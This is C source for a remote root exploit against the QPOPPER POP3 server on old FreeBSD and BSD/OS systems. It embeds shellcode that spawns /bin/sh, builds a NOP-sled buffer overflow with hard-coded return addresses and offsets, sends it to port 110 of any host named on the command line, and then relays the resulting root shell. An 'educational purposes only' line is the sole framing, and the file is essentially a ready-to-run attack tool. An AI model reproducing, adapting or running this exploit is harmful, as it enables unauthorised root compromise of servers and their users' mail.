/*
 *      QPOPPER - remote root exploit
 *      by Miroslaw Grzybek <mig@zeus.polsl.gliwice.pl>
 *
 *              - tested against: FreeBSD 3.0
 *                                FreeBSD 2.2.x
 *                                BSDI BSD/OS 2.1
 *              - offsets: FreeBSD with qpopper 2.3 - 2.4    0
 *                         FreeBSD with qpopper 2.1.4-R3     900
 *                         BSD/OS  with qpopper 2.1.4-R3     1500
 *
 *      this is for EDUCATIONAL purposes ONLY
 */

#include        <stdio.h>
#include        <stdlib.h>
#include        <sys/time.h>
#include        <sys/types.h>
#include        <unistd.h>
#include        <sys/socket.h>
#include        <netinet/in.h>
#include        <netdb.h>

#include        <sys/errno.h>

char *shell="\xeb\x32\x5e\x31\xdb\x89\x5e\x07\x89\x5e\x12\x89\x5e\x17"
            "\x88\x5e\x1c\x8d\x1e\x89\x5e\x0e\x31\xc0\xb0\x3b\x8d\x7e"
            "\x0e\x89\xfa\x89\xf9\xbf\x10\x10\x10\x10\x29\x7e\xf5\x89"
            "\xcf\xeb\x01\xff\x62\x61\x63\x60\xeb\x1b\xe8\xc9\xff\xff"
            "\xff/bin/sh\xaa\xaa\xaa\xaa\xff\xff\xff\xbb\xbb\xbb\xbb"
            "\xcc\xcc\xcc\xcc\x9a\xaa\xaa\xaa\xaa\x07\xaa";

#define ADDR 0xefbfd504
#define OFFSET 0
#define BUFLEN 1200

char    buf[BUFLEN];
int     offset=OFFSET;

int     sock;
struct  sockaddr_in sa;
struct  hostent *hp;

void main (int argc, char *argv[]) {
        int i;

        if(argc<2) {
                printf("Usage: %s <IP | HOSTNAME> [offset]\n",argv[0]);
                exit(0);
        }
        if(argc>2)
                offset=atoi(argv[2]);

        /* Prepare buffer */
        memset(buf,0x90,BUFLEN);
        memcpy(buf+800,shell,strlen(shell));
        for(i=901;i<BUFLEN-4;i+=4)
                *(int *)&buf[i]=ADDR+offset;
        buf[BUFLEN]='\n';

        /* Resolve remote hostname & connect*/
        if((hp=(struct hostent *)gethostbyname(argv[1]))==NULL) {
                perror("gethostbyname()");
                exit(0);
        }

        if((sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP))<0) {
                perror("socket()");
                exit(0);
        }
        sa.sin_family=AF_INET;
        sa.sin_port=htons(110);
        memcpy((char *)&sa.sin_addr,(char *)hp->h_addr,hp->h_length);
        if(connect(sock,(struct sockaddr *)&sa,sizeof(sa))!=0) {
                perror("connect()");
                exit(0);
        }
        printf("CONNECTED TO %s... SENDING DATA\n",argv[1]); fflush(stdout);
        /* Write evil data */
        write(sock,buf,strlen(buf));

        /* Enjoy root shell ;) */
        while(1) {
                fd_set input;

                FD_SET(0,&input);
                FD_SET(sock,&input);
                if((select(sock+1,&input,NULL,NULL,NULL))<0) {
                        if(errno==EINTR) continue;
                        printf("CONNECTION CLOSED...\n"); fflush(stdout);
                        exit(1);
                }
                if(FD_ISSET(sock,&input))
                        write(1,buf,read(sock,buf,BUFLEN));
                if(FD_ISSET(0,&input))
                        write(sock,buf,read(0,buf,BUFLEN));
        }
}
